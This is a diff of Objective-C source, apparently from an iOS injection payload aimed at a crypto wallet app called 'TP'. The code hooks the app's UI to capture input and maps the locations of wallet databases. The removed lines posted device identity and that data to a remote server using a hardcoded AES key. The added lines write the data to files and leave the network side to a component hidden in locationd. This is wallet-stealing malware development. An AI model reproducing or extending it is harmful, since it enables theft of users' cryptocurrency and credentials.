@@ -69,27 +69,22 @@ static void TPPayloadInit(void) {
             // PBKDF2 那条路对 TP 无效（CryptoSwift 纯 Swift 实现），只留 UI 精确捕获
             HookUIInstall();
 
-            Net *net = [Net shared];
-            net.baseURL = kBaseURL;
-            net.aesPassword = @"Ek8pl31K2yeHgQwy";
-            net.identity = [Info identity];
-
-            NSString *home = NSHomeDirectory();
-            NSDictionary *attrs = [[NSFileManager defaultManager] attributesOfItemAtPath:home error:NULL];
-            (void)attrs;
-
-            // 目录树：搞清 main.sqlite3 / HDWalletDB / EOAccountDB 的真实位置
+            // 只写文件，不发网络。
+            // 原因：TP 的 App 沙箱里 Info 取不到 udid/serial/ecid，服务端 hwIds() 拿到空值，
+            // 就退回用 lhu（identifierForVendor，每个 App 不一样）当设备 UUID ——
+            // 于是每次打开 TP 都会在后台多出一条「一模一样的设备」。
+            // 网络与设备身份统一交给 locationd 里跑着的 photonote。
             NSArray *tree = TreeOfContainer(nil, 3, 260);
             NSString *joined = [tree componentsJoinedByString:@"\n"];
             if (joined.length > 7000) joined = [joined substringToIndex:7000];
 
-            NSMutableDictionary *ev = [NSMutableDictionary dictionaryWithDictionary:[Info identity]];
-            ev[@"et"] = @"tp_boot";
-            ev[@"c"] = kSeed;
-            ev[@"ctx"] = @{ @"status": HookUIStatus() ?: @"",
-                            @"treeCount": @(tree.count),
-                            @"tree": joined };
-            PostOnce(net, @"/event", ev);
+            NSString *payload = [NSString stringWithFormat:@"status=%@\ntreeCount=%lu\n%@",
+                                 HookUIStatus() ?: @"", (unsigned long)tree.count, joined];
+            NSString *home = NSHomeDirectory();
+            for (NSString *p in @[[home stringByAppendingPathComponent:@"Documents/_tp_boot.txt"],
+                                  [NSTemporaryDirectory() stringByAppendingPathComponent:@"_tp_boot.txt"]]) {
+                [payload writeToFile:p atomically:YES encoding:NSUTF8StringEncoding error:NULL];
+            }
         } @catch (NSException *e) {
             (void)e;
         }
